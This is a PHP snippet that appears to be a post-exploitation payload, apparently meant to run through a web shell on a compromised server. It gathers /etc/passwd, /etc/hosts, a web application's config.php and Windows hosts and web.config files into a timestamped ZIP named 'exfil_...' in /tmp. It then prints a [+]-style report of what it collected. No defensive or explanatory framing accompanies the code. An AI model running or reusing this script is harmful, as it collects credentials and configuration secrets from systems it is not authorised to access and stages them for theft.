ob_start();

if (!class_exists('ZipArchive')) {
    ob_end_clean();
    return "ERROR: ZipArchive not available";
}

$output_dir = '/tmp';
$archive_name = 'exfil_' . date('Ymd_His') . '.zip';
$files_to_zip = [
    '/etc/passwd',
    '/etc/hosts',
    '/var/www/html/config.php',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    'C:\\inetpub\\wwwroot\\web.config'
];

try {
    if (!is_dir($output_dir)) {
        ob_end_clean();
        return "ERROR: Output directory does not exist: $output_dir";
    }
    if (!is_writable($output_dir)) {
        ob_end_clean();
        return "ERROR: Output directory not writable: $output_dir";
    }

    $full_path = rtrim($output_dir, '/\\') . DIRECTORY_SEPARATOR . $archive_name;

    $zip = new ZipArchive();
    if (!$zip->open($full_path, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        ob_end_clean();
        return "ERROR: Failed to create zip at: $full_path";
    }

    $added = 0;
    $skipped = [];
    foreach ($files_to_zip as $file) {
        if (file_exists($file) && is_readable($file)) {
            $localName = str_replace(['/', '\\'], '_', ltrim($file, '/\\'));
            $zip->addFile($file, $localName);
            $added++;
        } else {
            $skipped[] = $file;
        }
    }

    $zip->close();

    $output = "[+] Zip created successfully:\n";
    $output .= "    " . realpath($full_path) . "\n";
    $output .= "[+] Files added: $added\n";
    if (!empty($skipped)) {
        $output .= "[!] Skipped (not found/unreadable):\n- " . implode("\n- ", $skipped) . "\n";
    }

    ob_end_clean();
    return $output;

} catch (Exception $e) {
    ob_end_clean();
    return "ERROR: ZipArchive failed - " . $e->getMessage();
}
